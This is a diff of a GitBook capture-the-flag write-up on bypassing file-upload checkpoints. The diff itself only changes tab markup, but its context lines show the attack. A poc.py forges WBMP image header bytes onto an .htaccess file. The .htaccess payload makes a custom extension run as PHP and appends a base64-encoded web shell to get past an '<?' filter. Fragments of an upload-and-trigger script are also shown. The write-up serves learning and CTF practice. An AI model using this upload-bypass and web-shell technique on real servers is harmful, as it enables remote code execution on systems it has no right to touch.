@@ -12,8 +12,8 @@ So it was 1 AM when i joined the contest, i was intend to play about ~ 2 hours t
 
 ## Bypass checkpoints
 
-{% code-tabs %}
-{% code-tabs-item title="checkpoints.php" %}
+{% tabs %}
+{% tab title="checkpoints.php" %}
 ```php
 <?php
 if (isset($_GET["source"])) 
@@ -98,8 +98,8 @@ echo "</ul>";
 </form>
 <!-- /?source -->
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ### Checkpoint 1 : Name
 
@@ -200,44 +200,44 @@ static int php_get_wbmp(php_stream *stream, struct gfxinfo **result, int check)
 }
 ```
 
-{% code-tabs %}
-{% code-tabs-item title="Source" %}
+{% tabs %}
+{% tab title="Source" %}
 ```text
 https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 With a little bit math calculation, we can get it done
 
 ![](.gitbook/assets/image%20%28215%29.png)
 
-{% code-tabs %}
-{% code-tabs-item title="poc.py" %}
+{% tabs %}
+{% tab title="poc.py" %}
 ```text
 out = chr(0x00) + chr(0x00) + chr(0x8a) + chr(0x39) + chr(0x80) + chr(0x8a) + chr(0x39) + chr(0x00)
 print out
 out += '''your htaccess'''
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ### Checkpoint 5 : PHP
 
 It was checking if "&lt;?" is in the uploaded file, so we need encode the shell in base64
 
-{% code-tabs %}
-{% code-tabs-item title=".htaccess" %}
+{% tabs %}
+{% tab title=".htaccess" %}
 ```text
 AddType application/x-httpd-php .corb3nik php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.corb3nik"Upload shell
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 &lt;3 Credits go all to Corb3nik
 
-{% code-tabs %}
-{% code-tabs-item title="up\_shell.py" %}
+{% tabs %}
+{% tab title="up\_shell.py" %}
 ```python
 #!/usr/bin/env python3
 
@@ -274,8 +274,8 @@ upload_content("trigger.corb3nik", VALID_WBMP)
 response = requests.get(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.corb3nik")
 print(response.text)
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ## It's not done yet
 
